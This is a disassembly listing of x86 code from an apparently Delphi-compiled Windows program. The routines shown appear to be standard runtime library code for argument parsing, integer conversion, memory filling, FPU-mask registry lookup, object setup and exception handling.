  402a24:	89 06                	mov    %eax,(%esi)
  402a26:	8b 06                	mov    (%esi),%eax
  402a28:	80 38 20             	cmpb   $0x20,(%eax)
  402a2b:	77 9e                	ja     0x4029cb
  402a2d:	8b 44 24 04          	mov    0x4(%esp),%eax
  402a31:	8b d5                	mov    %ebp,%edx
  402a33:	e8 bc 11 00 00       	call   0x403bf4
  402a38:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402a3c:	89 06                	mov    %eax,(%esi)
  402a3e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402a42:	8b 00                	mov    (%eax),%eax
  402a44:	89 44 24 10          	mov    %eax,0x10(%esp)
  402a48:	33 ed                	xor    %ebp,%ebp
  402a4a:	eb 7b                	jmp    0x402ac7
  402a4c:	8b 06                	mov    (%esi),%eax
  402a4e:	80 38 22             	cmpb   $0x22,(%eax)
  402a51:	75 50                	jne    0x402aa3
  402a53:	8b 06                	mov    (%esi),%eax
  402a55:	50                   	push   %eax
  402a56:	e8 2d e6 ff ff       	call   0x401088
  402a5b:	89 06                	mov    %eax,(%esi)
  402a5d:	eb 24                	jmp    0x402a83
  402a5f:	8b 06                	mov    (%esi),%eax
  402a61:	50                   	push   %eax
  402a62:	e8 21 e6 ff ff       	call   0x401088
  402a67:	89 07                	mov    %eax,(%edi)
  402a69:	8b 06                	mov    (%esi),%eax
  402a6b:	3b 07                	cmp    (%edi),%eax
  402a6d:	73 14                	jae    0x402a83
  402a6f:	8b 06                	mov    (%esi),%eax
  402a71:	8a 00                	mov    (%eax),%al
  402a73:	8b 54 24 10          	mov    0x10(%esp),%edx
  402a77:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  402a7a:	ff 06                	incl   (%esi)
  402a7c:	45                   	inc    %ebp
  402a7d:	8b 06                	mov    (%esi),%eax
  402a7f:	3b 07                	cmp    (%edi),%eax
  402a81:	72 ec                	jb     0x402a6f
  402a83:	8b 06                	mov    (%esi),%eax
  402a85:	8a 18                	mov    (%eax),%bl
  402a87:	84 db                	test   %bl,%bl
  402a89:	74 05                	je     0x402a90
  402a8b:	80 fb 22             	cmp    $0x22,%bl
  402a8e:	75 cf                	jne    0x402a5f
  402a90:	8b 06                	mov    (%esi),%eax
  402a92:	80 38 00             	cmpb   $0x0,(%eax)
  402a95:	74 30                	je     0x402ac7
  402a97:	8b 06                	mov    (%esi),%eax
  402a99:	50                   	push   %eax
  402a9a:	e8 e9 e5 ff ff       	call   0x401088
  402a9f:	89 06                	mov    %eax,(%esi)
  402aa1:	eb 24                	jmp    0x402ac7
  402aa3:	8b 06                	mov    (%esi),%eax
  402aa5:	50                   	push   %eax
  402aa6:	e8 dd e5 ff ff       	call   0x401088
  402aab:	89 07                	mov    %eax,(%edi)
  402aad:	8b 06                	mov    (%esi),%eax
  402aaf:	3b 07                	cmp    (%edi),%eax
  402ab1:	73 14                	jae    0x402ac7
  402ab3:	8b 06                	mov    (%esi),%eax
  402ab5:	8a 00                	mov    (%eax),%al
  402ab7:	8b 54 24 10          	mov    0x10(%esp),%edx
  402abb:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  402abe:	ff 06                	incl   (%esi)
  402ac0:	45                   	inc    %ebp
  402ac1:	8b 06                	mov    (%esi),%eax
  402ac3:	3b 07                	cmp    (%edi),%eax
  402ac5:	72 ec                	jb     0x402ab3
  402ac7:	8b 06                	mov    (%esi),%eax
  402ac9:	80 38 20             	cmpb   $0x20,(%eax)
  402acc:	0f 87 7a ff ff ff    	ja     0x402a4c
  402ad2:	8b 06                	mov    (%esi),%eax
  402ad4:	89 44 24 08          	mov    %eax,0x8(%esp)
  402ad8:	8b 44 24 08          	mov    0x8(%esp),%eax
  402adc:	83 c4 18             	add    $0x18,%esp
  402adf:	5d                   	pop    %ebp
  402ae0:	5f                   	pop    %edi
  402ae1:	5e                   	pop    %esi
  402ae2:	5b                   	pop    %ebx
  402ae3:	c3                   	ret
  402ae4:	53                   	push   %ebx
  402ae5:	56                   	push   %esi
  402ae6:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  402aec:	8b da                	mov    %edx,%ebx
  402aee:	8b f0                	mov    %eax,%esi
  402af0:	8b c3                	mov    %ebx,%eax
  402af2:	e8 59 0c 00 00       	call   0x403750
  402af7:	85 f6                	test   %esi,%esi
  402af9:	75 20                	jne    0x402b1b
  402afb:	68 05 01 00 00       	push   $0x105
  402b00:	8d 44 24 08          	lea    0x8(%esp),%eax
  402b04:	50                   	push   %eax
  402b05:	6a 00                	push   $0x0
  402b07:	e8 ac e5 ff ff       	call   0x4010b8
  402b0c:	8b c8                	mov    %eax,%ecx
  402b0e:	8d 54 24 04          	lea    0x4(%esp),%edx
  402b12:	8b c3                	mov    %ebx,%eax
  402b14:	e8 27 0d 00 00       	call   0x403840
  402b19:	eb 21                	jmp    0x402b3c
  402b1b:	e8 88 e5 ff ff       	call   0x4010a8
  402b20:	89 04 24             	mov    %eax,(%esp)
  402b23:	8b d3                	mov    %ebx,%edx
  402b25:	8b 04 24             	mov    (%esp),%eax
  402b28:	e8 53 fe ff ff       	call   0x402980
  402b2d:	89 04 24             	mov    %eax,(%esp)
  402b30:	85 f6                	test   %esi,%esi
  402b32:	74 08                	je     0x402b3c
  402b34:	83 3b 00             	cmpl   $0x0,(%ebx)
  402b37:	74 03                	je     0x402b3c
  402b39:	4e                   	dec    %esi
  402b3a:	eb e7                	jmp    0x402b23
  402b3c:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  402b42:	5e                   	pop    %esi
  402b43:	5b                   	pop    %ebx
  402b44:	c3                   	ret
  402b45:	8d 40 00             	lea    0x0(%eax),%eax
  402b48:	3c 61                	cmp    $0x61,%al
  402b4a:	72 06                	jb     0x402b52
  402b4c:	3c 7a                	cmp    $0x7a,%al
  402b4e:	77 02                	ja     0x402b52
  402b50:	2c 20                	sub    $0x20,%al
  402b52:	c3                   	ret
  402b53:	90                   	nop
  402b54:	53                   	push   %ebx
  402b55:	56                   	push   %esi
  402b56:	8b d8                	mov    %eax,%ebx
  402b58:	33 f6                	xor    %esi,%esi
  402b5a:	66 8b 43 04          	mov    0x4(%ebx),%ax
  402b5e:	66 3d b1 d7          	cmp    $0xd7b1,%ax
  402b62:	72 2f                	jb     0x402b93
  402b64:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  402b68:	77 29                	ja     0x402b93
  402b6a:	66 25 b2 d7          	and    $0xd7b2,%ax
  402b6e:	66 3d b2 d7          	cmp    $0xd7b2,%ax
  402b72:	75 07                	jne    0x402b7b
  402b74:	8b c3                	mov    %ebx,%eax
  402b76:	ff 53 1c             	call   *0x1c(%ebx)
  402b79:	8b f0                	mov    %eax,%esi
  402b7b:	85 f6                	test   %esi,%esi
  402b7d:	75 07                	jne    0x402b86
  402b7f:	8b c3                	mov    %ebx,%eax
  402b81:	ff 53 24             	call   *0x24(%ebx)
  402b84:	8b f0                	mov    %eax,%esi
  402b86:	85 f6                	test   %esi,%esi
  402b88:	74 1b                	je     0x402ba5
  402b8a:	8b c6                	mov    %esi,%eax
  402b8c:	e8 9f fd ff ff       	call   0x402930
  402b91:	eb 12                	jmp    0x402ba5
  402b93:	81 fb 38 b0 40 00    	cmp    $0x40b038,%ebx
  402b99:	74 0a                	je     0x402ba5
  402b9b:	b8 67 00 00 00       	mov    $0x67,%eax
  402ba0:	e8 8b fd ff ff       	call   0x402930
  402ba5:	8b c6                	mov    %esi,%eax
  402ba7:	5e                   	pop    %esi
  402ba8:	5b                   	pop    %ebx
  402ba9:	c3                   	ret
  402baa:	8b c0                	mov    %eax,%eax
  402bac:	57                   	push   %edi
  402bad:	89 c7                	mov    %eax,%edi
  402baf:	88 cd                	mov    %cl,%ch
  402bb1:	89 c8                	mov    %ecx,%eax
  402bb3:	c1 e0 10             	shl    $0x10,%eax
  402bb6:	66 89 c8             	mov    %cx,%ax
  402bb9:	89 d1                	mov    %edx,%ecx
  402bbb:	c1 f9 02             	sar    $0x2,%ecx
  402bbe:	78 09                	js     0x402bc9
  402bc0:	f3 ab                	rep stos %eax,%es:(%edi)
  402bc2:	89 d1                	mov    %edx,%ecx
  402bc4:	83 e1 03             	and    $0x3,%ecx
  402bc7:	f3 aa                	rep stos %al,%es:(%edi)
  402bc9:	5f                   	pop    %edi
  402bca:	c3                   	ret
  402bcb:	90                   	nop
  402bcc:	53                   	push   %ebx
  402bcd:	56                   	push   %esi
  402bce:	57                   	push   %edi
  402bcf:	89 c6                	mov    %eax,%esi
  402bd1:	50                   	push   %eax
  402bd2:	85 c0                	test   %eax,%eax
  402bd4:	74 6c                	je     0x402c42
  402bd6:	31 c0                	xor    %eax,%eax
  402bd8:	31 db                	xor    %ebx,%ebx
  402bda:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  402bdf:	8a 1e                	mov    (%esi),%bl
  402be1:	46                   	inc    %esi
  402be2:	80 fb 20             	cmp    $0x20,%bl
  402be5:	74 f8                	je     0x402bdf
  402be7:	b5 00                	mov    $0x0,%ch
  402be9:	80 fb 2d             	cmp    $0x2d,%bl
  402bec:	74 62                	je     0x402c50
  402bee:	80 fb 2b             	cmp    $0x2b,%bl
  402bf1:	74 5f                	je     0x402c52
  402bf3:	80 fb 24             	cmp    $0x24,%bl
  402bf6:	74 5f                	je     0x402c57
  402bf8:	80 fb 78             	cmp    $0x78,%bl
  402bfb:	74 5a                	je     0x402c57
  402bfd:	80 fb 58             	cmp    $0x58,%bl
  402c00:	74 55                	je     0x402c57
  402c02:	80 fb 30             	cmp    $0x30,%bl
  402c05:	75 13                	jne    0x402c1a
  402c07:	8a 1e                	mov    (%esi),%bl
  402c09:	46                   	inc    %esi
  402c0a:	80 fb 78             	cmp    $0x78,%bl
  402c0d:	74 48                	je     0x402c57
  402c0f:	80 fb 58             	cmp    $0x58,%bl
  402c12:	74 43                	je     0x402c57
  402c14:	84 db                	test   %bl,%bl
  402c16:	74 20                	je     0x402c38
  402c18:	eb 04                	jmp    0x402c1e
  402c1a:	84 db                	test   %bl,%bl
  402c1c:	74 2d                	je     0x402c4b
  402c1e:	80 eb 30             	sub    $0x30,%bl
  402c21:	80 fb 09             	cmp    $0x9,%bl
  402c24:	77 25                	ja     0x402c4b
  402c26:	39 f8                	cmp    %edi,%eax
  402c28:	77 21                	ja     0x402c4b
  402c2a:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402c2d:	01 c0                	add    %eax,%eax
  402c2f:	01 d8                	add    %ebx,%eax
  402c31:	8a 1e                	mov    (%esi),%bl
  402c33:	46                   	inc    %esi
  402c34:	84 db                	test   %bl,%bl
  402c36:	75 e6                	jne    0x402c1e
  402c38:	fe cd                	dec    %ch
  402c3a:	74 09                	je     0x402c45
  402c3c:	85 c0                	test   %eax,%eax
  402c3e:	7d 54                	jge    0x402c94
  402c40:	eb 09                	jmp    0x402c4b
  402c42:	46                   	inc    %esi
  402c43:	eb 06                	jmp    0x402c4b
  402c45:	f7 d8                	neg    %eax
  402c47:	7e 4b                	jle    0x402c94
  402c49:	78 49                	js     0x402c94
  402c4b:	5b                   	pop    %ebx
  402c4c:	29 de                	sub    %ebx,%esi
  402c4e:	eb 47                	jmp    0x402c97
  402c50:	fe c5                	inc    %ch
  402c52:	8a 1e                	mov    (%esi),%bl
  402c54:	46                   	inc    %esi
  402c55:	eb 9c                	jmp    0x402bf3
  402c57:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402c5c:	8a 1e                	mov    (%esi),%bl
  402c5e:	46                   	inc    %esi
  402c5f:	84 db                	test   %bl,%bl
  402c61:	74 df                	je     0x402c42
  402c63:	80 fb 61             	cmp    $0x61,%bl
  402c66:	72 03                	jb     0x402c6b
  402c68:	80 eb 20             	sub    $0x20,%bl
  402c6b:	80 eb 30             	sub    $0x30,%bl
  402c6e:	80 fb 09             	cmp    $0x9,%bl
  402c71:	76 0b                	jbe    0x402c7e
  402c73:	80 eb 11             	sub    $0x11,%bl
  402c76:	80 fb 05             	cmp    $0x5,%bl
  402c79:	77 d0                	ja     0x402c4b
  402c7b:	80 c3 0a             	add    $0xa,%bl
  402c7e:	39 f8                	cmp    %edi,%eax
  402c80:	77 c9                	ja     0x402c4b
  402c82:	c1 e0 04             	shl    $0x4,%eax
  402c85:	01 d8                	add    %ebx,%eax
  402c87:	8a 1e                	mov    (%esi),%bl
  402c89:	46                   	inc    %esi
  402c8a:	84 db                	test   %bl,%bl
  402c8c:	75 d5                	jne    0x402c63
  402c8e:	fe cd                	dec    %ch
  402c90:	75 02                	jne    0x402c94
  402c92:	f7 d8                	neg    %eax
  402c94:	59                   	pop    %ecx
  402c95:	31 f6                	xor    %esi,%esi
  402c97:	89 32                	mov    %esi,(%edx)
  402c99:	5f                   	pop    %edi
  402c9a:	5e                   	pop    %esi
  402c9b:	5b                   	pop    %ebx
  402c9c:	c3                   	ret
  402c9d:	8d 40 00             	lea    0x0(%eax),%eax
  402ca0:	b9 ff 00 00 00       	mov    $0xff,%ecx
  402ca5:	e8 02 00 00 00       	call   0x402cac
  402caa:	c3                   	ret
  402cab:	90                   	nop
  402cac:	53                   	push   %ebx
  402cad:	50                   	push   %eax
  402cae:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402cb4:	76 05                	jbe    0x402cbb
  402cb6:	b9 ff 00 00 00       	mov    $0xff,%ecx
  402cbb:	8a 1a                	mov    (%edx),%bl
  402cbd:	42                   	inc    %edx
  402cbe:	84 db                	test   %bl,%bl
  402cc0:	74 06                	je     0x402cc8
  402cc2:	40                   	inc    %eax
  402cc3:	88 18                	mov    %bl,(%eax)
  402cc5:	49                   	dec    %ecx
  402cc6:	75 f3                	jne    0x402cbb
  402cc8:	5a                   	pop    %edx
  402cc9:	29 d0                	sub    %edx,%eax
  402ccb:	88 02                	mov    %al,(%edx)
  402ccd:	5b                   	pop    %ebx
  402cce:	c3                   	ret
  402ccf:	90                   	nop
  402cd0:	ff 25 10 c1 40 00    	jmp    *0x40c110
  402cd6:	8b c0                	mov    %eax,%eax
  402cd8:	53                   	push   %ebx
  402cd9:	33 db                	xor    %ebx,%ebx
  402cdb:	6a 00                	push   $0x0
  402cdd:	e8 ee ff ff ff       	call   0x402cd0
  402ce2:	83 f8 07             	cmp    $0x7,%eax
  402ce5:	75 1c                	jne    0x402d03
  402ce7:	6a 01                	push   $0x1
  402ce9:	e8 e2 ff ff ff       	call   0x402cd0
  402cee:	25 00 ff 00 00       	and    $0xff00,%eax
  402cf3:	3d 00 0d 00 00       	cmp    $0xd00,%eax
  402cf8:	74 07                	je     0x402d01
  402cfa:	3d 00 04 00 00       	cmp    $0x400,%eax
  402cff:	75 02                	jne    0x402d03
  402d01:	b3 01                	mov    $0x1,%bl
  402d03:	8b c3                	mov    %ebx,%eax
  402d05:	5b                   	pop    %ebx
  402d06:	c3                   	ret
  402d07:	90                   	nop
  402d08:	55                   	push   %ebp
  402d09:	8b ec                	mov    %esp,%ebp
  402d0b:	83 c4 f4             	add    $0xfffffff4,%esp
  402d0e:	0f b7 05 18 a0 40 00 	movzwl 0x40a018,%eax
  402d15:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402d18:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402d1b:	50                   	push   %eax
  402d1c:	6a 01                	push   $0x1
  402d1e:	6a 00                	push   $0x0
  402d20:	68 a0 2d 40 00       	push   $0x402da0
  402d25:	68 02 00 00 80       	push   $0x80000002
  402d2a:	e8 a9 e3 ff ff       	call   0x4010d8
  402d2f:	85 c0                	test   %eax,%eax
  402d31:	75 4d                	jne    0x402d80
  402d33:	33 c0                	xor    %eax,%eax
  402d35:	55                   	push   %ebp
  402d36:	68 79 2d 40 00       	push   $0x402d79
  402d3b:	64 ff 30             	push   %fs:(%eax)
  402d3e:	64 89 20             	mov    %esp,%fs:(%eax)
  402d41:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  402d48:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402d4b:	50                   	push   %eax
  402d4c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402d4f:	50                   	push   %eax
  402d50:	6a 00                	push   $0x0
  402d52:	6a 00                	push   $0x0
  402d54:	68 bc 2d 40 00       	push   $0x402dbc
  402d59:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d5c:	50                   	push   %eax
  402d5d:	e8 7e e3 ff ff       	call   0x4010e0
  402d62:	33 c0                	xor    %eax,%eax
  402d64:	5a                   	pop    %edx
  402d65:	59                   	pop    %ecx
  402d66:	59                   	pop    %ecx
  402d67:	64 89 10             	mov    %edx,%fs:(%eax)
  402d6a:	68 80 2d 40 00       	push   $0x402d80
  402d6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d72:	50                   	push   %eax
  402d73:	e8 58 e3 ff ff       	call   0x4010d0
  402d78:	c3                   	ret
  402d79:	e9 46 04 00 00       	jmp    0x4031c4
  402d7e:	eb ef                	jmp    0x402d6f
  402d80:	66 a1 18 a0 40 00    	mov    0x40a018,%ax
  402d86:	66 25 c0 ff          	and    $0xffc0,%ax
  402d8a:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
  402d8e:	66 83 e2 3f          	and    $0x3f,%dx
  402d92:	66 0b c2             	or     %dx,%ax
  402d95:	66 a3 18 a0 40 00    	mov    %ax,0x40a018
  402d9b:	8b e5                	mov    %ebp,%esp
  402d9d:	5d                   	pop    %ebp
  402d9e:	c3                   	ret
  402d9f:	00 53 4f             	add    %dl,0x4f(%ebx)
  402da2:	46                   	inc    %esi
  402da3:	54                   	push   %esp
  402da4:	57                   	push   %edi
  402da5:	41                   	inc    %ecx
  402da6:	52                   	push   %edx
  402da7:	45                   	inc    %ebp
  402da8:	5c                   	pop    %esp
  402da9:	42                   	inc    %edx
  402daa:	6f                   	outsl  %ds:(%esi),(%dx)
  402dab:	72 6c                	jb     0x402e19
  402dad:	61                   	popa
  402dae:	6e                   	outsb  %ds:(%esi),(%dx)
  402daf:	64 5c                	fs pop %esp
  402db1:	44                   	inc    %esp
  402db2:	65 6c                	gs insb (%dx),%es:(%edi)
  402db4:	70 68                	jo     0x402e1e
  402db6:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  402dbd:	50 
  402dbe:	55                   	push   %ebp
  402dbf:	4d                   	dec    %ebp
  402dc0:	61                   	popa
  402dc1:	73 6b                	jae    0x402e2e
  402dc3:	56                   	push   %esi
  402dc4:	61                   	popa
  402dc5:	6c                   	insb   (%dx),%es:(%edi)
  402dc6:	75 65                	jne    0x402e2d
  402dc8:	00 00                	add    %al,(%eax)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	db e3                	fninit
  402dce:	9b d9 2d 18 a0 40 00 	fldcw  0x40a018
  402dd5:	c3                   	ret
  402dd6:	8b c0                	mov    %eax,%eax
  402dd8:	53                   	push   %ebx
  402dd9:	8b d8                	mov    %eax,%ebx
  402ddb:	8b c3                	mov    %ebx,%eax
  402ddd:	e8 26 00 00 00       	call   0x402e08
  402de2:	e8 45 fa ff ff       	call   0x40282c
  402de7:	8b d0                	mov    %eax,%edx
  402de9:	8b c3                	mov    %ebx,%eax
  402deb:	e8 5c 00 00 00       	call   0x402e4c
  402df0:	5b                   	pop    %ebx
  402df1:	c3                   	ret
  402df2:	8b c0                	mov    %eax,%eax
  402df4:	53                   	push   %ebx
  402df5:	8b d8                	mov    %eax,%ebx
  402df7:	8b c3                	mov    %ebx,%eax
  402df9:	e8 a6 00 00 00       	call   0x402ea4
  402dfe:	8b c3                	mov    %ebx,%eax
  402e00:	e8 57 fa ff ff       	call   0x40285c
  402e05:	5b                   	pop    %ebx
  402e06:	c3                   	ret
  402e07:	90                   	nop
  402e08:	83 c0 d8             	add    $0xffffffd8,%eax
  402e0b:	8b 00                	mov    (%eax),%eax
  402e0d:	c3                   	ret
  402e0e:	8b c0                	mov    %eax,%eax
  402e10:	84 d2                	test   %dl,%dl
  402e12:	74 08                	je     0x402e1c
  402e14:	83 c4 f0             	add    $0xfffffff0,%esp
  402e17:	e8 14 01 00 00       	call   0x402f30
  402e1c:	84 d2                	test   %dl,%dl
  402e1e:	74 0f                	je     0x402e2f
  402e20:	e8 63 01 00 00       	call   0x402f88
  402e25:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402e2c:	83 c4 0c             	add    $0xc,%esp
  402e2f:	c3                   	ret
  402e30:	e8 63 01 00 00       	call   0x402f98
  402e35:	84 d2                	test   %dl,%dl
  402e37:	7e 05                	jle    0x402e3e
  402e39:	e8 42 01 00 00       	call   0x402f80
  402e3e:	c3                   	ret
  402e3f:	90                   	nop
  402e40:	85 c0                	test   %eax,%eax
  402e42:	74 07                	je     0x402e4b
  402e44:	b2 01                	mov    $0x1,%dl
  402e46:	8b 08                	mov    (%eax),%ecx
  402e48:	ff 51 fc             	call   *-0x4(%ecx)
  402e4b:	c3                   	ret
  402e4c:	53                   	push   %ebx
  402e4d:	56                   	push   %esi
  402e4e:	57                   	push   %edi
  402e4f:	89 c3                	mov    %eax,%ebx
  402e51:	89 d7                	mov    %edx,%edi
  402e53:	ab                   	stos   %eax,%es:(%edi)
  402e54:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  402e57:	31 c0                	xor    %eax,%eax
  402e59:	51                   	push   %ecx
  402e5a:	c1 e9 02             	shr    $0x2,%ecx
  402e5d:	49                   	dec    %ecx
  402e5e:	f3 ab                	rep stos %eax,%es:(%edi)
  402e60:	59                   	pop    %ecx
  402e61:	83 e1 03             	and    $0x3,%ecx
  402e64:	f3 aa                	rep stos %al,%es:(%edi)
  402e66:	89 d0                	mov    %edx,%eax
  402e68:	89 e2                	mov    %esp,%edx
  402e6a:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  402e6d:	85 c9                	test   %ecx,%ecx
  402e6f:	74 01                	je     0x402e72
  402e71:	51                   	push   %ecx
  402e72:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  402e75:	85 db                	test   %ebx,%ebx
  402e77:	74 04                	je     0x402e7d
  402e79:	8b 1b                	mov    (%ebx),%ebx
  402e7b:	eb ed                	jmp    0x402e6a
  402e7d:	39 d4                	cmp    %edx,%esp
  402e7f:	74 1d                	je     0x402e9e
  402e81:	5b                   	pop    %ebx
  402e82:	8b 0b                	mov    (%ebx),%ecx
  402e84:	83 c3 04             	add    $0x4,%ebx
  402e87:	8b 73 10             	mov    0x10(%ebx),%esi
  402e8a:	85 f6                	test   %esi,%esi
  402e8c:	74 06                	je     0x402e94
  402e8e:	8b 7b 14             	mov    0x14(%ebx),%edi
  402e91:	89 34 07             	mov    %esi,(%edi,%eax,1)
  402e94:	83 c3 1c             	add    $0x1c,%ebx
  402e97:	49                   	dec    %ecx
  402e98:	75 ed                	jne    0x402e87
  402e9a:	39 d4                	cmp    %edx,%esp
  402e9c:	75 e3                	jne    0x402e81
  402e9e:	5f                   	pop    %edi
  402e9f:	5e                   	pop    %esi
  402ea0:	5b                   	pop    %ebx
  402ea1:	c3                   	ret
  402ea2:	8b c0                	mov    %eax,%eax
  402ea4:	53                   	push   %ebx
  402ea5:	56                   	push   %esi
  402ea6:	89 c3                	mov    %eax,%ebx
  402ea8:	89 c6                	mov    %eax,%esi
  402eaa:	8b 36                	mov    (%esi),%esi
  402eac:	8b 56 c0             	mov    -0x40(%esi),%edx
  402eaf:	8b 76 dc             	mov    -0x24(%esi),%esi
  402eb2:	85 d2                	test   %edx,%edx
  402eb4:	74 07                	je     0x402ebd
  402eb6:	e8 e9 0e 00 00       	call   0x403da4
  402ebb:	89 d8                	mov    %ebx,%eax
  402ebd:	85 f6                	test   %esi,%esi
  402ebf:	75 e9                	jne    0x402eaa
  402ec1:	5e                   	pop    %esi
  402ec2:	5b                   	pop    %ebx
  402ec3:	c3                   	ret
  402ec4:	57                   	push   %edi
  402ec5:	96                   	xchg   %eax,%esi
  402ec6:	eb 02                	jmp    0x402eca
  402ec8:	8b 36                	mov    (%esi),%esi
  402eca:	8b 7e d0             	mov    -0x30(%esi),%edi
  402ecd:	85 ff                	test   %edi,%edi
  402ecf:	74 0d                	je     0x402ede
  402ed1:	0f b7 0f             	movzwl (%edi),%ecx
  402ed4:	51                   	push   %ecx
  402ed5:	83 c7 02             	add    $0x2,%edi
  402ed8:	f2 66 af             	repnz scas %es:(%edi),%ax
  402edb:	74 0a                	je     0x402ee7
  402edd:	59                   	pop    %ecx
  402ede:	8b 76 dc             	mov    -0x24(%esi),%esi
  402ee1:	85 f6                	test   %esi,%esi
  402ee3:	75 e3                	jne    0x402ec8
  402ee5:	5f                   	pop    %edi
  402ee6:	c3                   	ret
  402ee7:	58                   	pop    %eax
  402ee8:	01 c0                	add    %eax,%eax
  402eea:	29 c8                	sub    %ecx,%eax
  402eec:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  402ef0:	5f                   	pop    %edi
  402ef1:	c3                   	ret
  402ef2:	8b c0                	mov    %eax,%eax
  402ef4:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  402ef9:	c3                   	ret
  402efa:	8b c0                	mov    %eax,%eax
  402efc:	c3                   	ret
  402efd:	8d 40 00             	lea    0x0(%eax),%eax
  402f00:	c3                   	ret
  402f01:	8d 40 00             	lea    0x0(%eax),%eax
  402f04:	c3                   	ret
  402f05:	8d 40 00             	lea    0x0(%eax),%eax
  402f08:	56                   	push   %esi
  402f09:	66 8b 32             	mov    (%edx),%si
  402f0c:	66 09 f6             	or     %si,%si
  402f0f:	74 17                	je     0x402f28
  402f11:	66 81 fe 00 c0       	cmp    $0xc000,%si
  402f16:	73 10                	jae    0x402f28
  402f18:	50                   	push   %eax
  402f19:	8b 00                	mov    (%eax),%eax
  402f1b:	e8 a4 ff ff ff       	call   0x402ec4
  402f20:	58                   	pop    %eax
  402f21:	74 05                	je     0x402f28
  402f23:	89 f1                	mov    %esi,%ecx
  402f25:	5e                   	pop    %esi
  402f26:	ff e1                	jmp    *%ecx
  402f28:	5e                   	pop    %esi
  402f29:	8b 08                	mov    (%eax),%ecx
  402f2b:	ff 61 f0             	jmp    *-0x10(%ecx)
  402f2e:	c3                   	ret
  402f2f:	90                   	nop
  402f30:	52                   	push   %edx
  402f31:	51                   	push   %ecx
  402f32:	53                   	push   %ebx
  402f33:	84 d2                	test   %dl,%dl
  402f35:	7c 03                	jl     0x402f3a
  402f37:	ff 50 f4             	call   *-0xc(%eax)
  402f3a:	31 d2                	xor    %edx,%edx
  402f3c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402f40:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402f43:	89 19                	mov    %ebx,(%ecx)
  402f45:	89 69 08             	mov    %ebp,0x8(%ecx)
  402f48:	c7 41 04 59 2f 40 00 	movl   $0x402f59,0x4(%ecx)
  402f4f:	89 41 0c             	mov    %eax,0xc(%ecx)
  402f52:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402f55:	5b                   	pop    %ebx
  402f56:	59                   	pop    %ecx
  402f57:	5a                   	pop    %edx
  402f58:	c3                   	ret
  402f59:	e9 3a 01 00 00       	jmp    0x403098
  402f5e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402f62:	8b 40 0c             	mov    0xc(%eax),%eax
  402f65:	85 c0                	test   %eax,%eax
  402f67:	74 0e                	je     0x402f77
  402f69:	8b 08                	mov    (%eax),%ecx
  402f6b:	b2 81                	mov    $0x81,%dl
  402f6d:	50                   	push   %eax
  402f6e:	ff 51 fc             	call   *-0x4(%ecx)
  402f71:	58                   	pop    %eax
  402f72:	e8 09 00 00 00       	call   0x402f80
  402f77:	e8 80 02 00 00       	call   0x4031fc
  402f7c:	c3                   	ret
  402f7d:	8d 40 00             	lea    0x0(%eax),%eax
  402f80:	8b 10                	mov    (%eax),%edx
  402f82:	ff 52 f8             	call   *-0x8(%edx)
  402f85:	c3                   	ret
  402f86:	8b c0                	mov    %eax,%eax
  402f88:	53                   	push   %ebx
  402f89:	8b d8                	mov    %eax,%ebx
  402f8b:	8b c3                	mov    %ebx,%eax
  402f8d:	8b 10                	mov    (%eax),%edx
  402f8f:	ff 52 e4             	call   *-0x1c(%edx)
  402f92:	8b c3                	mov    %ebx,%eax
  402f94:	5b                   	pop    %ebx
  402f95:	c3                   	ret
  402f96:	8b c0                	mov    %eax,%eax
  402f98:	84 d2                	test   %dl,%dl
  402f9a:	7f 01                	jg     0x402f9d
  402f9c:	c3                   	ret
  402f9d:	50                   	push   %eax
  402f9e:	52                   	push   %edx
  402f9f:	8b 10                	mov    (%eax),%edx
  402fa1:	ff 52 e8             	call   *-0x18(%edx)
  402fa4:	5a                   	pop    %edx
  402fa5:	58                   	pop    %eax
  402fa6:	c3                   	ret
  402fa7:	90                   	nop
  402fa8:	80 3d 1c a0 40 00 01 	cmpb   $0x1,0x40a01c
  402faf:	76 11                	jbe    0x402fc2
  402fb1:	6a 00                	push   $0x0
  402fb3:	6a 00                	push   $0x0
  402fb5:	6a 00                	push   $0x0
  402fb7:	68 df fa ed 0e       	push   $0xeedfadf
  402fbc:	ff 15 10 b0 40 00    	call   *0x40b010
  402fc2:	c3                   	ret
  402fc3:	90                   	nop
  402fc4:	80 3d 1c a0 40 00 00 	cmpb   $0x0,0x40a01c
  402fcb:	74 17                	je     0x402fe4
  402fcd:	50                   	push   %eax
  402fce:	50                   	push   %eax
  402fcf:	52                   	push   %edx
  402fd0:	54                   	push   %esp
  402fd1:	6a 02                	push   $0x2
  402fd3:	6a 00                	push   $0x0
  402fd5:	68 e4 fa ed 0e       	push   $0xeedfae4
  402fda:	ff 15 10 b0 40 00    	call   *0x40b010
  402fe0:	83 c4 08             	add    $0x8,%esp
  402fe3:	58                   	pop    %eax
  402fe4:	c3                   	ret
  402fe5:	8d 40 00             	lea    0x0(%eax),%eax
